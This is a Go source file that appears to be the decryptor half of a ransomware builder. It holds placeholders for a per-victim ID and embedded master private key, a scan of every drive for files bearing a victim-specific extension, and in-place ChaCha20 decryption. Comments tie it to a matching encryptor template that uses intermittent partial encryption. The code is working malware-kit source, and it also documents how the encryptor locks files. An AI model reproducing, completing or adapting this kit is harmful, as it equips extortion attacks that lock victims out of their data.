package main

import (
	"crypto/ecdh"
	"crypto/hmac"
	"crypto/sha256"
	"encoding/binary"
	"fmt"
	"io"
	"os"
	"path/filepath"
	"runtime"
	"strings"
	"sync"
	"sync/atomic"
	"syscall"
	"time"
	"unsafe"

	"golang.org/x/crypto/chacha20"
	"golang.org/x/crypto/hkdf"
	"golang.org/x/sys/windows"
)

const myID = "{{.ID}}"

const (
	footerMagic = 0x4C494E47
	footerSize  = 96 // 4(magic) + 8(origSize) + 1(pattern) + 3(reserved) + 32(ephPub) + 16(salt) + 32(hmac)
	chunkSize   = 1 << 20 // 1 MB
)

const (
	PatternFull          = 0
	PatternIntermittent1 = 1
	PatternIntermittent2 = 2
)

// Windows drive type constants from GetDriveTypeW.
const (
	driveRemovable = 2
	driveFixed     = 3
	driveRemote    = 4
	driveRAMDisk   = 6
)

var masterPrivKeyBytes = []byte{{.PrivateKeyBytes}}

type Stats struct {
	files     int64
	folders   int64
	skipped   int64
	errors    int64
	totalSize int64
}

func (s *Stats) addError()            { atomic.AddInt64(&s.errors, 1) }
func (s *Stats) addSkipped()          { atomic.AddInt64(&s.skipped, 1) }
func (s *Stats) addFolder()           { atomic.AddInt64(&s.folders, 1) }
func (s *Stats) addFile(size int64)   { atomic.AddInt64(&s.files, 1); atomic.AddInt64(&s.totalSize, size) }
func (s *Stats) loadFiles() int64     { return atomic.LoadInt64(&s.files) }
func (s *Stats) loadFolders() int64   { return atomic.LoadInt64(&s.folders) }
func (s *Stats) loadSkipped() int64   { return atomic.LoadInt64(&s.skipped) }
func (s *Stats) loadErrors() int64    { return atomic.LoadInt64(&s.errors) }
func (s *Stats) loadTotalSize() int64 { return atomic.LoadInt64(&s.totalSize) }

func isAllowedDriveType(dt uintptr) bool {
	return dt == driveRemovable || dt == driveFixed || dt == driveRemote || dt == driveRAMDisk
}

func detectDrives() []string {
	kernel32 := syscall.NewLazyDLL("kernel32.dll")
	getLogicalDrives := kernel32.NewProc("GetLogicalDrives")
	getDriveType := kernel32.NewProc("GetDriveTypeW")

	ret, _, _ := getLogicalDrives.Call()
	bitmask := uint32(ret)

	var drives []string
	for i := 0; i < 26; i++ {
		if bitmask&(1<<uint(i)) == 0 {
			continue
		}
		drive := fmt.Sprintf("%c:\\", rune('A'+i))
		ptr, _ := syscall.UTF16PtrFromString(drive)
		dt, _, _ := getDriveType.Call(uintptr(unsafe.Pointer(ptr)))
		if isAllowedDriveType(dt) {
			drives = append(drives, drive)
		}
	}
	return drives
}

func isSymlink(path string) bool {
	fi, err := os.Lstat(path)
	if err != nil {
		return false
	}
	return fi.Mode()&os.ModeSymlink != 0
}

func removeReadOnly(path string) {
	ptr, err := syscall.UTF16PtrFromString(path)
	if err != nil {
		return
	}
	attrs, err := syscall.GetFileAttributes(ptr)
	if err != nil {
		return
	}
	if attrs&syscall.FILE_ATTRIBUTE_READONLY != 0 {
		syscall.SetFileAttributes(ptr, attrs&^syscall.FILE_ATTRIBUTE_READONLY)
	}
}

func openFileRW(path string) (*os.File, error) {
	ptr, err := syscall.UTF16PtrFromString(path)
	if err != nil {
		return nil, err
	}
	h, err := syscall.CreateFile(ptr,
		syscall.GENERIC_READ|syscall.GENERIC_WRITE,
		syscall.FILE_SHARE_READ|syscall.FILE_SHARE_WRITE,
		nil, syscall.OPEN_EXISTING,
		syscall.FILE_ATTRIBUTE_NORMAL, 0)
	if err != nil {
		return nil, err
	}
	return os.NewFile(uintptr(h), path), nil
}

func createMutex(name string) bool {
	ptr, err := syscall.UTF16PtrFromString(name)
	if err != nil {
		return false
	}
	_, err = windows.CreateMutex(nil, false, ptr)
	return err == nil
}

func zeroMemory(data []byte) {
	for i := range data {
		data[i] = 0
	}
	runtime.KeepAlive(data)
}

func deriveFileKey(masterKey [32]byte, salt []byte) [32]byte {
	r := hkdf.New(sha256.New, masterKey[:], salt, []byte("filekey"))
	var key [32]byte
	if _, err := io.ReadFull(r, key[:]); err != nil {
		panic(err)
	}
	return key
}

// computeOffsets is an EXACT COPY of the encryptor's logic.
// Any change here MUST be mirrored in encryptor_template.go.
func computeOffsets(pattern int, origSize int64) []int64 {
	if pattern == PatternFull {
		n := (origSize + chunkSize - 1) / chunkSize
		offsets := make([]int64, n)
		for i := int64(0); i < n; i++ {
			offsets[i] = i * chunkSize
		}
		return offsets
	}

	step := int64(5 * 1024 * 1024)
	if pattern == PatternIntermittent2 {
		step = 50 * 1024 * 1024
	}

	var offsets []int64
	offsets = append(offsets, 0)

	for pos := step; pos+chunkSize <= origSize; pos += step {
		offsets = append(offsets, pos)
	}

	// Only add the last chunk if it doesn't overlap with the previous one.
	// Overlap causes double-XOR → HMAC mismatch during decryption.
	lastStart := origSize - chunkSize
	if lastStart > 0 && (len(offsets) == 0 || lastStart >= offsets[len(offsets)-1]+int64(chunkSize)) {
		offsets = append(offsets, lastStart)
	}

	if len(offsets) == 0 {
		n := (origSize + chunkSize - 1) / chunkSize
		offsets = make([]int64, n)
		for i := int64(0); i < n; i++ {
			offsets[i] = i * chunkSize
		}
	}
	return offsets
}

// fileFooter holds the parsed footer data from an encrypted file.
type fileFooter struct {
	origSize    int64
	pattern     int
	ephPubBytes []byte
	fileSalt    []byte
	storedHMAC  []byte
}

// readFooter reads and validates the 96-byte footer from the end of the file.
// Returns nil if the file is not encrypted or the footer is invalid.
func readFooter(f *os.File, fileSize int64) *fileFooter {
	if fileSize < int64(footerSize) {
		return nil
	}

	origSize := fileSize - footerSize
	footer := make([]byte, footerSize)
	if _, err := f.ReadAt(footer, origSize); err != nil {
		return nil
	}

	magic := binary.LittleEndian.Uint32(footer[0:4])
	if magic != footerMagic {
		return nil
	}

	origSizeFooter := int64(binary.LittleEndian.Uint64(footer[4:12]))
	if origSizeFooter != origSize {
		return nil
	}

	return &fileFooter{
		origSize:    origSize,
		pattern:     int(footer[12]),
		ephPubBytes: footer[16:48],
		fileSalt:    footer[48:64],
		storedHMAC:  footer[64:96],
	}
}

// verifyHMAC reads the ciphertext chunks and verifies integrity against the stored HMAC.
func verifyHMAC(f *os.File, offsets []int64, origSize int64, fileKey [32]byte, fileSalt, storedHMAC, buf []byte) bool {
	h := hmac.New(sha256.New, fileKey[:])
	h.Write(fileSalt)

	for _, offset := range offsets {
		readLen := chunkSize
		if offset+int64(readLen) > origSize {
			readLen = int(origSize - offset)
		}
		if _, err := f.Seek(offset, io.SeekStart); err != nil {
			return false
		}
		if n, _ := f.Read(buf[:readLen]); n != readLen {
			return false
		}
		h.Write(buf[:readLen])
	}

	return hmac.Equal(h.Sum(nil), storedHMAC)
}

// decryptChunks performs the in-place ChaCha20 XOR for each offset.
func decryptChunks(f *os.File, offsets []int64, origSize int64, fileKey [32]byte, buf, nonce []byte) bool {
	for _, offset := range offsets {
		readLen := chunkSize
		if offset+int64(readLen) > origSize {
			readLen = int(origSize - offset)
		}

		if _, err := f.Seek(offset, io.SeekStart); err != nil {
			return false
		}
		if n, _ := f.Read(buf[:readLen]); n != readLen {
			return false
		}

		clear(nonce)
		binary.LittleEndian.PutUint64(nonce[16:], uint64(offset))
		ciph, err := chacha20.NewUnauthenticatedCipher(fileKey[:], nonce)
		if err != nil {
			return false
		}
		ciph.XORKeyStream(buf[:readLen], buf[:readLen])

		if _, err := f.Seek(offset, io.SeekStart); err != nil {
			return false
		}
		if _, err := f.Write(buf[:readLen]); err != nil {
			return false
		}
	}
	return true
}

func decryptFile(encPath string, stats *Stats, masterPrivKey *ecdh.PrivateKey, buf, nonce []byte) {
	removeReadOnly(encPath)

	f, err := openFileRW(encPath)
	if err != nil {
		stats.addError()
		return
	}
	defer f.Close()

	info, err := f.Stat()
	if err != nil {
		stats.addError()
		return
	}

	// Read & validate footer
	ft := readFooter(f, info.Size())
	if ft == nil {
		stats.addSkipped()
		return
	}

	// Derive keys
	ephPub, err := ecdh.X25519().NewPublicKey(ft.ephPubBytes)
	if err != nil {
		stats.addError()
		return
	}
	shared, err := masterPrivKey.ECDH(ephPub)
	if err != nil {
		stats.addError()
		return
	}
	defer zeroMemory(shared)

	masterKey := sha256.Sum256(shared)
	fileKey := deriveFileKey(masterKey, ft.fileSalt)
	offsets := computeOffsets(ft.pattern, ft.origSize)

	// Verify HMAC (ciphertext integrity)
	if !verifyHMAC(f, offsets, ft.origSize, fileKey, ft.fileSalt, ft.storedHMAC, buf) {
		stats.addError()
		return
	}

	// Decrypt each chunk (XOR with ChaCha20)
	if !decryptChunks(f, offsets, ft.origSize, fileKey, buf, nonce) {
		stats.addError()
		return
	}

	// Finalize: sync, truncate footer, close, rename
	f.Sync()
	if err := f.Truncate(ft.origSize); err != nil {
		stats.addError()
		return
	}
	f.Close()

	ext := filepath.Ext(encPath)
	if ext != "" {
		origName := strings.TrimSuffix(encPath, ext)
		if err := os.Rename(encPath, origName); err != nil {
			stats.addError()
			return
		}
	}

	stats.addFile(ft.origSize)
}

func scanProducer(drives []string, dirChan chan<- string, wg *sync.WaitGroup, pending *sync.WaitGroup) {
	defer wg.Done()
	for _, d := range drives {
		pending.Add(1)
		dirChan <- d
	}
}

func dirWorker(stats *Stats, fileChan chan<- string, dirChan chan string, sem chan struct{}, wg *sync.WaitGroup, dirPend *sync.WaitGroup, filePend *sync.WaitGroup, targetExt string) {
	defer wg.Done()
	for dir := range dirChan {
		sem <- struct{}{}
		func(p string) {
			defer dirPend.Done()
			defer func() { <-sem }()

			if isSymlink(p) {
				stats.addSkipped()
				return
			}

			entries, err := os.ReadDir(p)
			if err != nil {
				stats.addError()
				return
			}

			for _, e := range entries {
				name := e.Name()
				full := filepath.Join(p, name)

				if e.IsDir() {
					// Only skip Recycle Bin & System Volume Information.
					// The decryptor must scan MORE broadly than the encryptor
					// to find all encrypted files, even in unusual locations.
					lower := strings.ToLower(name)
					if lower == "$recycle.bin" || lower == "system volume information" || (len(name) > 0 && name[0] == '$') {
						stats.addSkipped()
						continue
					}
					stats.addFolder()
					dirPend.Add(1)
					go func(s string) { dirChan <- s }(full)
				} else {
					if !strings.HasSuffix(name, "."+targetExt) {
						stats.addSkipped()
						continue
					}
					filePend.Add(1)
					go func(fp string) {
						defer filePend.Done()
						fileChan <- fp
					}(full)
				}
			}
		}(dir)
	}
}

func formatSize(b int64) string {
	const (
		KB = 1024
		MB = 1024 * KB
		GB = 1024 * MB
		TB = 1024 * GB
	)
	switch {
	case b >= TB:
		return fmt.Sprintf("%.2f TB", float64(b)/float64(TB))
	case b >= GB:
		return fmt.Sprintf("%.2f GB", float64(b)/float64(GB))
	case b >= MB:
		return fmt.Sprintf("%.2f MB", float64(b)/float64(MB))
	case b >= KB:
		return fmt.Sprintf("%.2f KB", float64(b)/float64(KB))
	default:
		return fmt.Sprintf("%d Bytes", b)
	}
}

func formatNumber(n int64) string {
	s := fmt.Sprintf("%d", n)
	if len(s) <= 3 {
		return s
	}
	var result []byte
	for i, c := range s {
		if i > 0 && (len(s)-i)%3 == 0 {
			result = append(result, '.')
		}
		result = append(result, byte(c))
	}
	return string(result)
}

func printBanner(numCPU, workers int, targetExt string) {
	fmt.Println(strings.Repeat("═", 50))
	fmt.Println("DECRYPTOR")
	fmt.Println(strings.Repeat("═", 50))
	fmt.Printf("CPU Cores : %d\n", numCPU)
	fmt.Printf("Workers   : %d\n", workers)
	fmt.Printf("Target ext: .%s\n", targetExt)
	fmt.Printf("Mulai     : %s\n", time.Now().Format("2006-01-02 15:04:05"))
	fmt.Println(strings.Repeat("─", 50))
}

func printResults(stats *Stats, elapsed time.Duration) {
	fmt.Println()
	fmt.Println(strings.Repeat("═", 50))
	fmt.Println("               HASIL DEKRIPSI")
	fmt.Println(strings.Repeat("═", 50))
	fmt.Printf("  File didekripsi : %s\n", formatNumber(stats.loadFiles()))
	fmt.Printf("  Total Folder    : %s\n", formatNumber(stats.loadFolders()))
	fmt.Printf("  Total Ukuran    : %s\n", formatSize(stats.loadTotalSize()))
	fmt.Printf("  Dilewati        : %s path\n", formatNumber(stats.loadSkipped()))
	fmt.Printf("  Error           : %s\n", formatNumber(stats.loadErrors()))
	fmt.Printf("  Durasi          : %s\n", elapsed.Round(time.Millisecond))
	fmt.Println(strings.Repeat("═", 50))
}

func main() {
	if len(os.Args) < 2 {
		fmt.Println("Usage: decryptor.exe <extension>")
		fmt.Println("Example: decryptor.exe x9F2aP")
		os.Exit(1)
	}
	targetExt := os.Args[1]

	if !createMutex("Global\\Decryptor_" + myID) {
		fmt.Println("[!] Another instance is already running. Exiting.")
		os.Exit(0)
	}

	numCPU := runtime.NumCPU()
	runtime.GOMAXPROCS(numCPU)
	workers := numCPU * 4

	fileChan := make(chan string, 1000)
	dirChan := make(chan string, 1000)

	printBanner(numCPU, workers, targetExt)

	start := time.Now()
	stats := &Stats{}

	masterPrivKey, err := ecdh.X25519().NewPrivateKey(masterPrivKeyBytes)
	if err != nil {
		panic("Invalid master private key")
	}

	// Start decryption workers — each gets its own buffer and nonce.
	var decWg sync.WaitGroup
	for i := 0; i < workers; i++ {
		decWg.Add(1)
		go func() {
			defer decWg.Done()
			buf := make([]byte, chunkSize)
			nonce := make([]byte, 24)
			for path := range fileChan {
				decryptFile(path, stats, masterPrivKey, buf, nonce)
			}
		}()
	}

	var prodWg, dirWg sync.WaitGroup
	var dirPend, filePend sync.WaitGroup

	var drives []string
	if len(os.Args) > 2 {
		drives = []string{os.Args[2]}
	} else {
		drives = detectDrives()
	}
	prodWg.Add(1)
	go scanProducer(drives, dirChan, &prodWg, &dirPend)

	go func() {
		prodWg.Wait()
		dirPend.Wait()
		close(dirChan)
	}()

	sem := make(chan struct{}, workers)
	for i := 0; i < workers; i++ {
		dirWg.Add(1)
		go dirWorker(stats, fileChan, dirChan, sem, &dirWg, &dirPend, &filePend, targetExt)
	}

	dirWg.Wait()
	filePend.Wait()
	close(fileChan)
	decWg.Wait()

	elapsed := time.Since(start)
	printResults(stats, elapsed)
}